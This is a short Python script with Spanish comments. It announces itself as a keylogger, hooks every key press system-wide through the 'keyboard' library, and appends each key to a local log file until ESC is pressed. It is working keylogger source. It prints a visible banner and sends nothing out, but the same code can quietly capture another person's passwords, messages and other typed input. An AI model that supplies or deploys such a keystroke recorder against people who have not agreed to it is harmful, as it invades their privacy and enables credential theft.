import keyboard

# --- Configuración ---
# Nuevo nombre de archivo más descriptivo
LOG_FILE = "key_events.log" 

def log_keystroke(event):
    """
    Función que se llama en cada pulsación de tecla.
    Escribe cada pulsación en una nueva línea para formato de columna.
    """
    
    # Solo procesamos la pulsación hacia abajo (KEY_DOWN)
    if event.event_type == keyboard.KEY_DOWN:
        key_name = event.name
        
        # Formateo de caracteres especiales
        if len(key_name) > 1:
            if key_name == 'space':
                log_entry = '[ESPACIO]'
            elif key_name == 'enter':
                log_entry = '[ENTER]'
            elif key_name == 'backspace':
                log_entry = '[BORRAR]'
            else:
                log_entry = f'[{key_name.upper()}]' # Ej: [SHIFT], [CTRL]
        else:
            log_entry = key_name # Carácter alfanumérico

        # Escribir la pulsación en el archivo en una NUEVA LÍNEA
        # Esto crea el efecto de "columna" donde cada evento es una entrada.
        with open(LOG_FILE, "a") as f:
            f.write(log_entry + '\n')  # Se añade '\n' para el salto de línea
        
        # Imprimir en consola 
        print(f"Logged: {log_entry}", end='\r')


# --- Ejecución ---
print("--- Keylogger Iniciado ---")
print(f"[INFO] El registro se guardará en: {LOG_FILE}")
print("[INFO] Pulsa cualquier tecla para empezar.")
print("[INFO] Presiona la tecla 'ESC' para detener.")

# Asocia la función 'log_keystroke' a cualquier evento de teclado
keyboard.hook(log_keystroke)

# Mantiene el script corriendo y esperando la pulsación de 'esc'
keyboard.wait('esc')

print("\n[FIN] Keylogger detenido por el usuario. Registro completo guardado.")